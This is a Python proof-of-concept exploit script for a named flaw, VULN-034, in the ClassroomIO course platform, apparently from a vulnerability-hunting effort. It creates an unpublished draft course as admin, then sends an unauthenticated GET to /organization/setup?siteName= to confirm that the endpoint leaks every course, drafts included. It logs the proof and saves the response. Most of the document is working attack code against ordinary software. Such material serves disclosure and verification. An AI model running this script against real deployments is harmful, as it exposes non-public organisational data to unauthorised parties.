#!/usr/bin/env python3
"""
VULN-034 (F-47) — Unauthenticated GET /organization/setup?siteName= returns every course
                  for the org, INCLUDING unpublished drafts.

Vulnerable code (targets/classroomio/):
  * route: apps/api/src/routes/organization/organization.ts:713-728  (.get('/setup', ...) — NO auth middleware)
  * query: packages/db/src/queries/course/course.ts:360-373
           (getCoursesBySiteNameForSetup — filters ONLY organization.siteName; the doc-comment on
            line 355-356 even admits it "includes unpublished courses")

Class: CWE-200 excessive data exposure (unauthenticated) — visibility filter omitted.

The flaw: /organization/setup is validated but not authenticated, and it resolves courses through
getCoursesBySiteNameForSetup whose only WHERE clause is organization.siteName — no type='PUBLIC',
no isPublished, no status filter. So an anonymous caller who knows the org's PUBLIC siteName (the
catalog slug) receives the full course catalog for the org, including in-development / unpublished
drafts that the hardened /org-site/* channel would never expose.

Exploitation idea: an admin creates an unpublished draft course; an UNAUTHENTICATED client GETs
/organization/setup?siteName=<siteName> and finds the draft in data.courseData.

Success proof: with NO session cookie, HTTP 200 whose data.courseData contains a course we just
created and left unpublished (isPublished=false) — enumeration of non-public course metadata.
"""
import os
import sys
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import log, banner, verdict, admin_login, create_course, API, BASE_URL, rid, psql  # noqa: E402

VULN = "VULN-034"
HERE = os.path.dirname(os.path.abspath(__file__))
SITE_NAME = os.environ.get("SITE_NAME", "cve-hunt-academy")


def anon_get(path):
    return requests.get(API + path, headers={"Origin": BASE_URL}, timeout=30, allow_redirects=False)


def main():
    banner(VULN, "Unauth GET /organization/setup leaks unpublished draft courses")
    log("INFO", "route apps/api/src/routes/organization/organization.ts:713 has NO auth middleware")
    log("INFO", "query getCoursesBySiteNameForSetup (course.ts:360-373) filters ONLY siteName")

    # --- Precondition: an admin creates an UNPUBLISHED draft course ---
    log("SETUP", "admin login")
    admin = admin_login()
    draft_title = f"Unreleased Draft {rid('d')}"
    course = create_course(admin, title=draft_title, ctype="SELF_PACED")
    cid = course["id"]
    dbrow = psql(f"select is_published, type, status from course where id='{cid}'")
    log("SETUP", f"draft course id={cid} title={draft_title!r}  (db is_published|type|status = {dbrow})")

    # --- The attack: an UNAUTHENTICATED client enumerates the org catalog ---
    log("STEP", f"UNAUTHENTICATED (no cookie) GET /organization/setup?siteName={SITE_NAME}")
    resp = anon_get(f"/organization/setup?siteName={SITE_NAME}")
    log("INFO", f"  response: HTTP {resp.status_code}")

    data = resp.json().get("data", {}) if resp.status_code == 200 else {}
    course_data = data.get("courseData", []) if isinstance(data, dict) else []
    ids = [c.get("id") for c in course_data if isinstance(c, dict)]
    draft = next((c for c in course_data if isinstance(c, dict) and c.get("id") == cid), None)

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"GET {API}/organization/setup?siteName={SITE_NAME}   (no Cookie header)\n")
        f.write(f"HTTP {resp.status_code}\n\n")
        f.write(f"data.courseData count = {len(course_data)}\n")
        f.write(f"our unpublished draft ({cid}) present = {draft is not None}\n")
        if draft is not None:
            f.write("draft row from anonymous response:\n")
            f.write(f"  title={draft.get('title')!r} isPublished={draft.get('isPublished')} "
                    f"type={draft.get('type')} status={draft.get('status')}\n")
        f.write("\nfull body:\n" + resp.text[:4000])

    log("INFO", f"  data.courseData returned {len(course_data)} courses to the anonymous caller")

    if resp.status_code == 200 and draft is not None and draft.get("isPublished") is False:
        log("PROOF", f"anonymous /setup returned our just-created UNPUBLISHED draft {draft.get('title')!r} "
                     f"(id={cid}, isPublished=false) among {len(course_data)} courses — no auth, "
                     f"no visibility gate")
        verdict(VULN, "CONFIRMED", "unauth /organization/setup enumerates unpublished draft courses")
        log("OK", "exploit confirmed — draft catalog leaked to an unauthenticated caller")
        sys.exit(0)

    verdict(VULN, "FAILED", f"HTTP {resp.status_code}; draft_present={draft is not None}")
    log("FAIL", "the unpublished draft was not returned to the anonymous caller")
    sys.exit(1)


if __name__ == "__main__":
    main()
